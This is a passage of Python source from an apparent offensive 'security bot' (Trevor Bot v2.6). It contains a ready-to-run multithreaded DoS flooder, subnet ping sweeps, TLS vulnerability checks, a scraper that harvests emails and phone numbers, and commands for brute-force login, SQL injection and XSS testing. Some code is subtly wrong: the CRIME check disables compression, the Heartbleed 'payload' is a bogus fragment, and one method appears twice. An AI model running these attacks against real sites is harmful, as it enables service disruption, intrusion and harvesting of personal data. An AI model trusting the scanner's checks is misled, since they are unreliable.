        if protocol in ['SSL', 'TLS 1.0', 'TLS 1.1']:
            return True
        
        # Then check cipher name
        for keyword in weak_keywords:
            if keyword in cipher:
                return True
        
        return False
    
    def check_heartbleed(self, host):
        """Check for Heartbleed vulnerability"""
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
            context.verify_mode = ssl.CERT_NONE
            context.check_hostname = False
            
            with socket.create_connection((host, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    # Send Heartbleed payload
                    payload = bytearray.fromhex(
                        "18 03 02 00 03 01 40 00"
                    )
                    ssock.send(payload)
                    
                    # Wait for response
                    time.sleep(1)
                    response = ssock.recv(1024)
                    
                    if len(response) > 0:
                        return True
        except:
            pass
        
        return False
    
    def check_crime_vulnerability(self, host):
        """Check for CRIME vulnerability (TLS compression)"""
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.verify_mode = ssl.CERT_NONE
            context.check_hostname = False
            
            # Enable compression
            context.options |= ssl.OP_NO_COMPRESSION
            
            with socket.create_connection((host, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    # Check if compression was actually enabled
                    return ssock.compression() is not None
        except:
            return False
    
    def check_freak_vulnerability(self, host):
        """Check for FREAK vulnerability (Export ciphers)"""
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.set_ciphers('EXPORT')
            context.verify_mode = ssl.CERT_NONE
            context.check_hostname = False
            
            with socket.create_connection((host, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    return True
        except:
            return False
    
    def check_logjam_vulnerability(self, host):
        """Check for LOGJAM vulnerability (DH EXPORT ciphers)"""
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.set_ciphers('EDH')
            context.verify_mode = ssl.CERT_NONE
            context.check_hostname = False
            
            with socket.create_connection((host, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    return True
        except:
            return False
    
    def check_drown_vulnerability(self, host):
        """Check for DROWN vulnerability (SSLv2)"""
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_SSLv2)
            context.verify_mode = ssl.CERT_NONE
            context.check_hostname = False
            
            with socket.create_connection((host, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    return True
        except:
            return False
    
    def scrape_website(self, url):
        """Enhanced web scraping with HTML/CSS/JS extraction and file saving capability"""
        self.typewriter_effect(f"📜 Starting ENHANCED web scraping of: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Reset scraped data
            self.scraped_data = []
            
            # Create a directory for scraped files
            domain = urlparse(url).netloc
            self.scraped_files_dir = os.path.join(os.getcwd(), f"scraped_{domain}")
            
            # Remove old directory if exists
            if os.path.exists(self.scraped_files_dir):
                shutil.rmtree(self.scraped_files_dir)
            
            # Create new directory structure
            os.makedirs(self.scraped_files_dir)
            os.makedirs(os.path.join(self.scraped_files_dir, "css"))
            os.makedirs(os.path.join(self.scraped_files_dir, "js"))
            os.makedirs(os.path.join(self.scraped_files_dir, "images"))
            
            # Save main HTML file
            main_html_path = os.path.join(self.scraped_files_dir, "index.html")
            with open(main_html_path, 'w', encoding='utf-8') as f:
                f.write(response.text)
            
            self.typewriter_effect(f"\n💾 Saved main HTML to: {main_html_path}")
            
            # 1. Get full HTML structure
            self.typewriter_effect("\n🔍 Extracting HTML structure...")
            html_structure = self.extract_html_structure(soup)
            self.scraped_data.append({
                'type': 'HTML Structure',
                'data': html_structure
            })
            
            # 2. Extract all CSS (inline, embedded, external)
            self.typewriter_effect("\n🎨 Extracting CSS...")
            css_data = self.extract_css(soup, url)
            self.scraped_data.append({
                'type': 'CSS',
                'data': css_data
            })
            
            # Save CSS files
            for i, css in enumerate(css_data['external']):
                css_path = os.path.join(self.scraped_files_dir, "css", f"external_{i}.css")
                with open(css_path, 'w', encoding='utf-8') as f:
                    f.write(css['content'])
                self.typewriter_effect(f"💾 Saved CSS to: {css_path}")
            
            # 3. Extract all JavaScript
            self.typewriter_effect("\n⚡ Extracting JavaScript...")
            js_data = self.extract_javascript(soup, url)
            self.scraped_data.append({
                'type': 'JavaScript',
                'data': js_data
            })
            
            # Save JavaScript files
            for i, js in enumerate(js_data['external']):
                js_path = os.path.join(self.scraped_files_dir, "js", f"external_{i}.js")
                with open(js_path, 'w', encoding='utf-8') as f:
                    f.write(js['content'])
                self.typewriter_effect(f"💾 Saved JS to: {js_path}")
            
            # 4. Extract all links
            self.typewriter_effect("\n🔗 Extracting links...")
            links = [a.get('href') for a in soup.find_all('a', href=True)]
            self.scraped_data.append({
                'type': 'Links',
                'data': links[:50]  # Store first 50 links
            })
            
            # 5. Extract all images
            self.typewriter_effect("\n🖼️ Extracting images...")
            images = [img.get('src') for img in soup.find_all('img', src=True)]
            self.scraped_data.append({
                'type': 'Images',
                'data': images[:20]  # Store first 20 images
            })
            
            # Download images
            for i, img_url in enumerate(images[:10]):  # Download first 10 images
                try:
                    if not img_url.startswith(('http', 'https')):
                        img_url = urljoin(url, img_url)
                    
                    img_response = self.session.get(img_url, stream=True, timeout=5)
                    if img_response.status_code == 200:
                        img_path = os.path.join(self.scraped_files_dir, "images", f"image_{i}{Path(img_url).suffix}")
                        with open(img_path, 'wb') as f:
                            for chunk in img_response.iter_content(1024):
                                f.write(chunk)
                        self.typewriter_effect(f"💾 Saved image to: {img_path}")
                except Exception as e:
                    continue
            
            # 6. Extract all forms
            self.typewriter_effect("\n📝 Extracting forms...")
            forms = []
            for form in soup.find_all('form'):
                form_data = self.extract_form_details(form)
                forms.append(form_data)
            self.scraped_data.append({
                'type': 'Forms',
                'data': forms
            })
            
            # 7. Extract meta tags
            self.typewriter_effect("\n🏷️ Extracting meta tags...")
            metas = []
            for meta in soup.find_all('meta'):
                metas.append({
                    'name': meta.get('name'),
                    'content': meta.get('content'),
                    'property': meta.get('property')
                })
            self.scraped_data.append({
                'type': 'Meta Tags',
                'data': metas[:20]  # Store first 20 meta tags
            })
            
            # 8. Extract text content
            self.typewriter_effect("\n📄 Extracting text content...")
            text = ' '.join([p.get_text() for p in soup.find_all('p')])
            self.scraped_data.append({
                'type': 'Text Content',
                'data': text[:1000] + '...'  # Store first 1000 chars
            })
            
            # 9. Extract emails
            self.typewriter_effect("\n✉️ Extracting emails...")
            emails = re.findall(r'[\w\.-]+@[\w\.-]+', response.text)
            if emails:
                self.scraped_data.append({
                    'type': 'Emails',
                    'data': list(set(emails))  # Remove duplicates
                })
            
            # 10. Extract phone numbers
            self.typewriter_effect("\n📞 Extracting phone numbers...")
            phone_numbers = re.findall(r'(\+?\d[\d\s\-\(\)]{7,}\d)', response.text)
            if phone_numbers:
                self.scraped_data.append({
                    'type': 'Phone Numbers',
                    'data': list(set(phone_numbers))  # Remove duplicates
                })
            
            self.typewriter_effect("\n✅ Enhanced web scraping completed!")
            self.typewriter_effect(f"📁 All scraped files saved to: {self.scraped_files_dir}")
            
        except Exception as e:
            self.typewriter_effect(f"❌ Web scraping failed: {str(e)}")
    
    def download_scraped_files(self):
        """Download all scraped files as a zip archive"""
        if not self.scraped_files_dir or not os.path.exists(self.scraped_files_dir):
            self.typewriter_effect("❌ No scraped files available. Run /scrape first.")
            return
        
        try:
            # Create zip file name
            domain = os.path.basename(self.scraped_files_dir).replace("scraped_", "")
            zip_filename = f"scraped_{domain}_{int(time.time())}.zip"
            
            # Create zip archive
            shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', self.scraped_files_dir)
            
            self.typewriter_effect(f"\n📦 Successfully created zip archive: {zip_filename}")
            self.typewriter_effect(f"💾 Path: {os.path.join(os.getcwd(), zip_filename)}")
            
        except Exception as e:
            self.typewriter_effect(f"❌ Failed to create zip archive: {str(e)}")
    
    def extract_html_structure(self, soup):
        """Extract HTML structure with important elements"""
        html_data = {
            'doctype': '',
            'html_tag': {},
            'head_elements': [],
            'body_structure': []
        }
        
        # Get DOCTYPE
        if soup.original_encoding:
            html_data['doctype'] = f"<!DOCTYPE {soup.original_encoding}>"
        
        # Get HTML tag attributes
        if soup.html:
            html_data['html_tag'] = dict(soup.html.attrs)
        
        # Get HEAD elements
        if soup.head:
            for child in soup.head.children:
                if child.name:
                    element = {
                        'tag': child.name,
                        'attributes': dict(child.attrs)
                    }
                    if child.name == 'title' and child.string:
                        element['content'] = child.string.strip()
                    html_data['head_elements'].append(element)
        
        # Get BODY structure (first 3 levels)
        if soup.body:
            html_data['body_structure'] = self.extract_body_structure(soup.body)
        
        return html_data

    def extract_body_structure(self, element, level=0, max_level=3):
        """Recursively extract body structure"""
        if level > max_level:
            return []
        
        structure = []
        for child in element.children:
            if child.name:
                node = {
                    'tag': child.name,
                    'attributes': dict(child.attrs),
                    'children': self.extract_body_structure(child, level+1, max_level)
                }
                structure.append(node)
        
        return structure

    def extract_css(self, soup, base_url):
        """Extract all CSS (inline, embedded, external)"""
        css_data = {
            'inline': [],
            'embedded': [],
            'external': []
        }
        
        # 1. Extract inline CSS
        for tag in soup.find_all(style=True):
            css_data['inline'].append({
                'tag': tag.name,
                'styles': tag['style']
            })
        
        # 2. Extract embedded CSS
        for style in soup.find_all('style'):
            if style.string:
                css_data['embedded'].append(style.string.strip())
        
        # 3. Extract external CSS
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href:
                css_url = urljoin(base_url, href)
                try:
                    css_response = self.session.get(css_url, timeout=5)
                    if css_response.status_code == 200:
                        css_data['external'].append({
                            'url': css_url,
                            'content': css_response.text
                        })
                except:
                    pass
        
        return css_data

    def extract_javascript(self, soup, base_url):
        """Extract all JavaScript (inline, external)"""
        js_data = {
            'inline': [],
            'external': []
        }
        
        # 1. Extract inline JS
        for script in soup.find_all('script'):
            if script.string and not script.get('src'):
                js_data['inline'].append(script.string.strip())
        
        # 2. Extract external JS
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src:
                js_url = urljoin(base_url, src)
                try:
                    js_response = self.session.get(js_url, timeout=5)
                    if js_response.status_code == 200:
                        js_data['external'].append({
                            'url': js_url,
                            'content': js_response.text
                        })
                except:
                    pass
        
        return js_data

    def extract_form_details(self, form):
        """Extract detailed form information"""
        form_data = {
            'action': form.get('action'),
            'method': form.get('method', 'GET'),
            'inputs': [],
            'buttons': [],
            'attributes': dict(form.attrs)
        }
        
        # Extract input fields
        for input_tag in form.find_all('input'):
            form_data['inputs'].append({
                'name': input_tag.get('name'),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value'),
                'attributes': {k: v for k, v in input_tag.attrs.items() 
                              if k not in ['name', 'type', 'value']}
            })
        
        # Extract textareas
        for textarea in form.find_all('textarea'):
            form_data['inputs'].append({
                'name': textarea.get('name'),
                'type': 'textarea',
                'value': textarea.string if textarea.string else '',
                'attributes': {k: v for k, v in textarea.attrs.items() 
                               if k != 'name'}
            })
        
        # Extract select options
        for select in form.find_all('select'):
            options = []
            for option in select.find_all('option'):
                options.append({
                    'value': option.get('value'),
                    'text': option.string if option.string else ''
                })
            
            form_data['inputs'].append({
                'name': select.get('name'),
                'type': 'select',
                'options': options,
                'attributes': {k: v for k, v in select.attrs.items() 
                              if k != 'name'}
            })
        
        # Extract buttons
        for button in form.find_all('button'):
            form_data['buttons'].append({
                'name': button.get('name'),
                'type': button.get('type', 'button'),
                'text': button.string if button.string else '',
                'attributes': {k: v for k, v in button.attrs.items() 
                              if k not in ['name', 'type']}
            })
        
        return form_data

    def show_scraped_data(self):
        """Enhanced display of scraped data with code preview"""
        if not self.scraped_data:
            self.typewriter_effect("\n📭 No scraped data available yet!")
            return
        
        self.typewriter_effect("\n📋 ENHANCED SCRAPED DATA REPORT:")
        self.typewriter_effect("══════════════════════════════════════════════")
        
        for item in self.scraped_data:
            self.typewriter_effect(f"\n🔍 {item['type']}:")
            self.typewriter_effect("──────────────────────────────────────────")
            
            if item['type'] == 'HTML Structure':
                self.display_html_structure(item['data'])
            elif item['type'] == 'CSS':
                self.display_code_data('CSS', item['data'])
            elif item['type'] == 'JavaScript':
                self.display_code_data('JavaScript', item['data'])
            elif item['type'] == 'Text Content':
                self.typewriter_effect(f"   {item['data']}")
            elif isinstance(item['data'], list):
                self.display_list_data(item['type'], item['data'])
            
            self.typewriter_effect("──────────────────────────────────────────")
        
        self.typewriter_effect(f"\n📋 Total data categories scraped: {len(self.scraped_data)}")
        if self.scraped_files_dir:
            self.typewriter_effect(f"📁 Scraped files directory: {self.scraped_files_dir}")

    def display_html_structure(self, html_data):
        """Display HTML structure in readable format"""
        self.typewriter_effect(f"   DOCTYPE: {html_data.get('doctype', 'Not specified')}")
        
        self.typewriter_effect("\n   HTML Tag Attributes:")
        for attr, value in html_data.get('html_tag', {}).items():
            self.typewriter_effect(f"      {attr}: {value}")
        
        self.typewriter_effect("\n   HEAD Elements:")
        for element in html_data.get('head_elements', [])[:5]:  # Show first 5
            self.typewriter_effect(f"      <{element['tag']}>")
            for attr, value in element.get('attributes', {}).items():
                self.typewriter_effect(f"         {attr}: {value}")
            if 'content' in element:
                self.typewriter_effect(f"         Content: {element['content']}")
        
        self.typewriter_effect("\n   BODY Structure (simplified):")
        self.display_html_nodes(html_data.get('body_structure', []), depth=1)

    def display_html_nodes(self, nodes, depth=0, max_depth=2):
        """Recursively display HTML nodes"""
        if depth > max_depth:
            return
        
        for node in nodes[:3]:  # Show first 3 nodes at each level
            indent = '   ' * (depth + 1)
            self.typewriter_effect(f"{indent}<{node['tag']}>")
            
            # Display attributes if any
            for attr, value in node.get('attributes', {}).items():
                self.typewriter_effect(f"{indent}   {attr}: {value}")
            
            # Recursively display children
            if node.get('children'):
                self.display_html_nodes(node['children'], depth+1, max_depth)

    def display_code_data(self, code_type, code_data):
        """Display CSS or JavaScript code data"""
        if code_type == 'CSS':
            self.typewriter_effect("   Inline Styles:")
            for style in code_data.get('inline', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      <{style['tag']}>: {style['styles'][:100]}...")
            
            self.typewriter_effect("\n   Embedded CSS:")
            for css in code_data.get('embedded', [])[:1]:  # Show first 1
                self.typewriter_effect(f"      {css[:200]}...")
            
            self.typewriter_effect("\n   External CSS Files:")
            for css in code_data.get('external', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      URL: {css['url']}")
                self.typewriter_effect(f"      Content Sample: {css['content'][:200]}...")
        
        elif code_type == 'JavaScript':
            self.typewriter_effect("   Inline JavaScript:")
            for js in code_data.get('inline', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      {js[:200]}...")
            
            self.typewriter_effect("\n   External JavaScript Files:")
            for js in code_data.get('external', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      URL: {js['url']}")
                self.typewriter_effect(f"      Content Sample: {js['content'][:200]}...")

    def display_list_data(self, data_type, data_list):
        """Display list-type data (links, images, etc.)"""
        if data_type == 'Forms':
            for i, form in enumerate(data_list[:2], 1):  # Show first 2 forms
                self.typewriter_effect(f"   Form {i}:")
                self.typewriter_effect(f"      Action: {form.get('action')}")
                self.typewriter_effect(f"      Method: {form.get('method')}")
                self.typewriter_effect(f"      Inputs: {len(form.get('inputs', []))}")
                self.typewriter_effect(f"      Buttons: {len(form.get('buttons', []))}")
        else:
            for i, item in enumerate(data_list[:5], 1):  # Show first 5 items
                if isinstance(item, str):
                    self.typewriter_effect(f"   {i}. {item}")
                elif isinstance(item, dict):
                    if data_type == 'Meta Tags':
                        self.typewriter_effect(f"   {i}. Name: {item.get('name')}")
                        self.typewriter_effect(f"      Content: {item.get('content')}")
                        self.typewriter_effect(f"      Property: {item.get('property')}")
        
        if len(data_list) > 5:
            self.typewriter_effect(f"   ... and {len(data_list)-5} more items")
    def display_list_data(self, data_type, data_list):
        """Display list-type data (links, images, etc.)"""
        if data_type == 'Forms':
            for i, form in enumerate(data_list[:2], 1):  # Show first 2 forms
                self.typewriter_effect(f"   Form {i}:")
                self.typewriter_effect(f"      Action: {form.get('action')}")
                self.typewriter_effect(f"      Method: {form.get('method')}")
                self.typewriter_effect(f"      Inputs: {len(form.get('inputs', []))}")
                self.typewriter_effect(f"      Buttons: {len(form.get('buttons', []))}")
        else:
            for i, item in enumerate(data_list[:5], 1):  # Show first 5 items
                if isinstance(item, str):
                    self.typewriter_effect(f"   {i}. {item}")
                elif isinstance(item, dict):
                    if data_type == 'Meta Tags':
                        self.typewriter_effect(f"   {i}. Name: {item.get('name')}")
                        self.typewriter_effect(f"      Content: {item.get('content')}")
                        self.typewriter_effect(f"      Property: {item.get('property')}")
        
        if len(data_list) > 5:
            self.typewriter_effect(f"   ... and {len(data_list)-5} more items")

    def show_reports(self):
        """Show vulnerability reports"""
        if not self.vulnerabilities:
            self.typewriter_effect("\n✅ No vulnerabilities found yet!")
            return
        
        self.typewriter_effect("\n📊 VULNERABILITY REPORT:")
        self.typewriter_effect("──────────────────────────────────────────────")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            self.typewriter_effect(f"\n🔍 Finding #{i}: {vuln['type']}")
            self.typewriter_effect(f"   Severity: {vuln['severity']}")
            self.typewriter_effect(f"   Description: {vuln['description']}")
            
            if 'url' in vuln:
                self.typewriter_effect(f"   URL: {vuln['url']}")
            if 'host' in vuln:
                self.typewriter_effect(f"   Host: {vuln['host']}")
            if 'parameter' in vuln:
                self.typewriter_effect(f"   Parameter: {vuln['parameter']}")
            if 'payload' in vuln:
                self.typewriter_effect(f"   Payload: {vuln['payload']}")
            if 'username' in vuln and 'password' in vuln:
                self.typewriter_effect(f"   Credentials: {vuln['username']}:{vuln['password']}")
            
            self.typewriter_effect("──────────────────────────────────────────────")
        self.typewriter_effect(f"\n📋 Total vulnerabilities found: {len(self.vulnerabilities)}")

    def host_discover(self, base_ip):
        self.typewriter_effect(f"🔍 Discovering hosts on subnet {base_ip}.0/24 ...")
        active_hosts = []
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            if platform.system().lower() == "windows":
                ping_cmd = f"ping -n 1 -w 300 {ip} > nul"
            else:
                ping_cmd = f"ping -c 1 -W 1 {ip} > /dev/null"
            response = os.system(ping_cmd)
            if response == 0:
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "Unknown"
                active_hosts.append((ip, hostname))
                print(f"✅ {ip}  ({hostname})")

        if not active_hosts:
            self.typewriter_effect("❌ No active hosts found.")
        else:
            self.typewriter_effect(f"✅ Total active hosts: {len(active_hosts)}")

    def dos_attack(self, target_url):
        """Customizable DoS attack for testing your own website's defenses"""
        self.typewriter_effect(f"💥 Preparing DoS attack on {target_url}")
        
        try:
            # Input validation
            while True:
                try:
                    requests_count = input("Enter number of requests (Default 1000 Max 10000): ").strip()
                    if not requests_count:
                        requests_count = 1000
                    else:
                        requests_count = int(requests_count)
                        if requests_count > 10000:
                            self.typewriter_effect("⚠️ Maximum is 10000, using 10000")
                            requests_count = 10000
                    break
                except ValueError:
                    self.typewriter_effect("❌ Please enter a valid number")
            
            while True:
                try:
                    thread_count = input("Enter number of threads (Default 10 Max 100): ").strip()
                    if not thread_count:
                        thread_count = 10
                    else:
                        thread_count = int(thread_count)
                        if thread_count > 100:
                            self.typewriter_effect("⚠️ Maximum is 100, using 100")
                            thread_count = 100
                    break
                except ValueError:
                    self.typewriter_effect("❌ Please enter a valid number")
            
            while True:
                try:
                    delay = input("Enter delay between requests in seconds (Default 0.1): ").strip()
                    if not delay:
                        delay = 0.1
                    else:
                        delay = float(delay)
                    break
                except ValueError:
                    self.typewriter_effect("❌ Please enter a valid number")
            
            # Confirmation
            self.typewriter_effect(f"\n⚡ Attack Configuration:")
            self.typewriter_effect(f"   Target: {target_url}")
            self.typewriter_effect(f"   Total Requests: {requests_count}")
            self.typewriter_effect(f"   Threads: {thread_count}")
            self.typewriter_effect(f"   Delay: {delay} seconds")
            
            confirm = input("\nAre you sure you want to launch this attack? (yes/no): ").lower()
            if confirm != 'yes':
                self.typewriter_effect("🛑 Attack cancelled")
                return
            
            # Attack statistics
            successful_requests = 0
            failed_requests = 0
            start_time = time.time()
            
            # Worker function
            def attack_worker(url, req_count, delay_time):
                nonlocal successful_requests, failed_requests
                for _ in range(req_count):
                    try:
                        response = requests.get(url, timeout=5)
                        if response.status_code == 200:
                            successful_requests += 1
                        else:
                            failed_requests += 1
                    except:
                        failed_requests += 1
                    time.sleep(delay_time)
            
            # Calculate requests per thread
            requests_per_thread = requests_count // thread_count
            remaining_requests = requests_count % thread_count
            
            # Start threads
            self.typewriter_effect("\n🚀 Launching DoS attack... Press Ctrl+C to stop")
            threads = []
            
            for i in range(thread_count):
                # Distribute remaining requests to first few threads
                req_count = requests_per_thread + (1 if i < remaining_requests else 0)
                if req_count > 0:
                    t = threading.Thread(target=attack_worker, args=(target_url, req_count, delay))
                    t.daemon = True
                    t.start()
                    threads.append(t)
            
            # Progress monitoring
            try:
                while any(t.is_alive() for t in threads):
                    elapsed = time.time() - start_time
                    reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
                    
                    sys.stdout.write(f"\r⚡ Status: {successful_requests + failed_requests}/{requests_count} requests | "
                                   f"Success: {successful_requests}✅| "
                                   f"Failed: {failed_requests} | "
                                   f"Rate: {reqs_per_sec:.1f} reqs/sec")
                    sys.stdout.flush()
                    time.sleep(0.5)
            except KeyboardInterrupt:
                self.typewriter_effect("\n🛑 Attack interrupted by user")
            
            # Final statistics
            elapsed = time.time() - start_time
            reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
            
            self.typewriter_effect("\n\n📊 Attack Results:")
            self.typewriter_effect(f"   Total Requests: {successful_requests + failed_requests}")
            self.typewriter_effect(f"   Successful: {successful_requests}")
            self.typewriter_effect(f"   Failed: {failed_requests}")
            self.typewriter_effect(f"   Duration: {elapsed:.2f} seconds")
            self.typewriter_effect(f"   Request Rate: {reqs_per_sec:.1f} requests/second")
            
        except Exception as e:
            self.typewriter_effect(f"❌ DoS attack failed: {str(e)}")

    def get_web_info(self, url):
        """Get comprehensive information about a website"""
        self.typewriter_effect(f"🌐 Gathering website information for: {url}")
        
        try:
            # Parse URL and validate
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            
            # Create result dictionary
            info = {
                'url': url,
                'domain': domain,
                'is_secure': parsed_url.scheme == 'https',
                'ip_address': '',
                'server_info': {},
                'technologies': [],
                'status': 'Unknown',
                'dns_records': {},
                'headers': {},
                'security_headers': {}
            }
            
            # Get IP address
            self.loading_animation("Resolving IP address")
            try:
                ip = socket.gethostbyname(domain)
                info['ip_address'] = ip
            except:
                info['ip_address'] = "Could not resolve"
            
            # Check if site is online
            self.loading_animation("Checking site availability")
            try:
                response = self.session.head(url, timeout=10)
                info['status'] = f"Online (HTTP {response.status_code})"
            except:
                info['status'] = "Offline or unreachable"
                self.typewriter_effect("\n❌ Website appears to be offline")
                return info
            
            # Get server headers
            self.loading_animation("Analyzing server headers")
            response = self.session.get(url, timeout=10)
            info['headers'] = dict(response.headers)
            
            # Extract server info from headers
            server_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
            for header in server_headers:
                if header in response.headers:
                    info['server_info'][header] = response.headers[header]
            
            # Check common security headers
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Referrer-Policy',
                'Feature-Policy',
                'Permissions-Policy'
            ]
            
            for header in security_headers:
                if header in response.headers:
                    info['security_headers'][header] = response.headers[header]
            
            # Get DNS records
            self.loading_animation("Checking DNS records")
            try:
                dns_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
                resolver = dns.resolver.Resolver()
                
                for record_type in dns_types:
                    try:
                        answers = resolver.resolve(domain, record_type)
                        info['dns_records'][record_type] = [str(r) for r in answers]
                    except:
                        continue
            except:
                info['dns_records'] = "DNS lookup failed"
            
            # Detect technologies (basic detection)
            self.loading_animation("Detecting technologies")
            tech_detected = set()
            
            # From headers
            if 'Server' in response.headers:
                server = response.headers['Server']
                tech_detected.add(server.split('/')[0])  # e.g. "nginx/1.2" -> "nginx"
            
            if 'X-Powered-By' in response.headers:
                powered_by = response.headers['X-Powered-By']
                tech_detected.update(x.strip() for x in powered_by.split(','))
            
            # From HTML content
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Detect WordPress
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                tech_detected.add('WordPress')
            
            # Detect jQuery
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script['src'].lower()
                if 'jquery' in src:
                    tech_detected.add('jQuery')
                if 'bootstrap' in src:
                    tech_detected.add('Bootstrap')
                if 'react' in src:
                    tech_detected.add('React')
                if 'vue' in src:
                    tech_detected.add('Vue.js')
            
            # Detect PHP
            if '.php' in response.text or 'PHPSESSID' in response.text:
                tech_detected.add('PHP')
            
            info['technologies'] = sorted(tech_detected)
            
            return info
            
        except Exception as e:
            self.typewriter_effect(f"❌ Website info gathering failed: {str(e)}")
            return None

    def display_web_info(self, info):
        """Display the website information in a formatted way"""
        if not info:
            self.typewriter_effect("❌ No website information to display")
            return
        
        self.typewriter_effect("\n🌐 WEBSITE INFORMATION REPORT:")
        self.typewriter_effect("══════════════════════════════════════════════")
        
        # Basic Info
        self.typewriter_effect(f"\n🔍 Basic Information:")
        self.typewriter_effect(f"   URL: {info['url']}")
        self.typewriter_effect(f"   Domain: {info['domain']}")
        self.typewriter_effect(f"   IP Address: {info['ip_address']}")
        self.typewriter_effect(f"   Secure (HTTPS): {'✅ Yes' if info['is_secure'] else '❌ No'}")
        self.typewriter_effect(f"   Status: {info['status']}")
        
        # Server Info
        if info['server_info']:
            self.typewriter_effect("\n🖥️ Server Information:")
            for key, value in info['server_info'].items():
                self.typewriter_effect(f"   {key}: {value}")
        else:
            self.typewriter_effect("\n⚠️ No server information found in headers")
        
        # Technologies
        if info['technologies']:
            self.typewriter_effect("\n⚙️ Detected Technologies:")
            for tech in info['technologies']:
                self.typewriter_effect(f"   - {tech}")
        else:
            self.typewriter_effect("\n⚠️ No technologies detected")
        
        # DNS Records
        if info['dns_records'] and isinstance(info['dns_records'], dict):
            self.typewriter_effect("\n📡 DNS Records:")
            for record_type, values in info['dns_records'].items():
                self.typewriter_effect(f"   {record_type}:")
                for value in values:
                    self.typewriter_effect(f"      {value}")
        else:
            self.typewriter_effect("\n⚠️ No DNS records retrieved")
        
        # Security Headers
        if info['security_headers']:
            self.typewriter_effect("\n🔒 Security Headers:")
            for header, value in info['security_headers'].items():
                self.typewriter_effect(f"   {header}: {value}")
            
            # Security rating
            important_headers = ['Strict-Transport-Security', 'Content-Security-Policy', 
                               'X-Content-Type-Options', 'X-Frame-Options']
            missing = [h for h in important_headers if h not in info['security_headers']]
            
            if not missing:
                self.typewriter_effect("\n✅ Excellent security headers configuration")
            elif len(missing) <= 2:
                self.typewriter_effect(f"\n⚠️ Missing some important security headers: {', '.join(missing)}")
            else:
                self.typewriter_effect(f"\n❌ Poor security headers - missing: {', '.join(missing)}")
        else:
            self.typewriter_effect("\n⚠️ No security headers found")
        
        self.typewriter_effect("\n✅ Website information gathering complete")

    def process_command(self, command):
        """Process user commands"""
        command = command.strip()
        
        if command.startswith('/scan:'):
            url = command[6:].strip()
            if url:
                self.comprehensive_scan(url)
            else:
                self.typewriter_effect("❌ Please provide a URL. Example: /scan:https://example.com")
        
        elif command.startswith('/bruteforce:'):
            url = command[12:].strip()
            if url:
                self.bruteforce_login(url)
            else:
                self.typewriter_effect("❌ Please provide a URL. Example: /bruteforce:https://site.com/login")
        
        elif command.startswith('/sqltest:'):
            url = command[9:].strip()
            if url:
                self.sql_injection_test(url)
            else:
                self.typewriter_effect("❌ Please provide a URL. Example: /sqltest:https://site.com/page.php?id=1")
        
        elif command.startswith('/xsstest:'):
            url = command[9:].strip()
            if url:
                self.xss_test(url)
            else:
                self.typewriter_effect("❌ Please provide a URL. Example: /xsstest:https://site.com/search.php")
        
        elif command.startswith('/portscan:'):
            host = command[10:].strip()
            if host:
                self.port_scan(host)
            else:
                self.typewriter_effect("❌ Please provide a host. Example: /portscan:192.168.1.1")
        
        elif command.startswith('/sslcheck:'):
            host = command[10:].strip()
            if host:
                self.ssl_check(host)
            else:
                self.typewriter_effect("❌ Please provide a host. Example: /sslcheck:example.com")
        
        elif command.startswith('/scrape:'):
            url = command[8:].strip()
            if url:
                self.scrape_website(url)
            else:
                self.typewriter_effect("❌ Please provide a URL. Example: /scrape:https://example.com")
        
        elif command == '/downldscrap':
            self.download_scraped_files()
        
        elif command == '/help':
            self.show_help()
        
        elif command == '/report':
            self.show_reports()
        
        elif command == '/scraped':
            self.show_scraped_data()
        
        elif command == '/exit':
            self.typewriter_effect("👋 Trevor Bot v2.6 shutting down...")
            self.typewriter_effect("🔒 All security data saved. Stay secure!")
            return False
        
        elif command.startswith("/hostdiscover:"):
            try:
                subnet = command.split(":")[1]
                self.host_discover(subnet)
            except IndexError:
                self.typewriter_effect("❌ Usage: /hostdiscover:192.168.1")

        elif command.startswith("/dos:"):
            url = command[5:].strip()
            if url:
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                self.dos_attack(url)
            else:
                self.typewriter_effect("❌ Please provide a URL. Example: /dos:https://example.com")

        elif command.startswith('/webinfo:'):
            url = command[9:].strip()
            if url:
                info = self.get_web_info(url)
                if info:
                    self.display_web_info(info)
            else:
                self.typewriter_effect("❌ Please provide a URL. Example: /webinfo:https://example.com")
                
        else:
            self.typewriter_effect("❓ Unknown command. Type /help for available commands.")
        
        return True
    
    def run(self):
        """Main bot loop"""
        self.show_banner()
        self.typewriter_effect("Type /help for available security testing commands")
